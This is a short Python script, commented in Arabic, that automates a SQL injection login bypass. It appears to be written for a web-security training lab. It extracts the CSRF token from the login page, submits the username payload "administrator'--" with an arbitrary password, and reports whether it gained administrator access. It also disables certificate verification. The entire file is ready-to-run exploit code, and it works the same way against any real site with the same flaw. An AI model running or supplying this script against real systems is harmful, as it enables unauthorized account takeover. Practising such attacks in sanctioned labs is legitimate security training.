import requests
import sys
import urllib3

# إخفاء تحذيرات شهادات الأمان لكي يكون مخرج السكريبت نظيفاً
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_bypass(url):
    login_url = f"{url}/login"
    payload = "administrator'--"
    
    # استخدام Session لحفظ الجلسة وملفات تعريف الارتباط (Cookies)
    session = requests.Session()
    
    print(f"[*] Fetching login page to extract CSRF token...")
    try:
        # 1. جلب الصفحة
        response = session.get(login_url, verify=False)
        
        # 2. استخراج الـ CSRF Token ببساطة عبر تقسيم النصوص
        csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
        print(f"[+] CSRF Token extracted: {csrf_token}")
        
    except IndexError:
        print("[-] Failed to get CSRF token. Check if the URL is correct or if the lab expired.")
        sys.exit(-1)
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        sys.exit(-1)

    print(f"[*] Attempting SQL Injection with payload: {payload}")
    
    # 3. تجهيز البيانات للإرسال
    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "anypassword"
    }

    # 4. إرسال الهجوم
    login_response = session.post(login_url, data=data, verify=False)

    # 5. التحقق من النتيجة
    if "Log out" in login_response.text:
        print("[+] Success! Successfully bypassed the login and logged in as administrator.")
    else:
        print("[-] Exploit failed. The payload did not work.")

if __name__ == "__main__":
    # التحقق من أن المستخدم أدخل رابط اللاب عند تشغيل السكريبت
    if len(sys.argv) != 2:
        print("Usage: python3 sqli_login_bypass.py <url>")
        print("Example: python3 sqli_login_bypass.py https://0a...web-security-academy.net")
        sys.exit(-1)
    
    # تنظيف الرابط من أي شرطات مائلة زائدة في النهاية
    target_url = sys.argv[1].strip("/")
    exploit_sqli_bypass(target_url)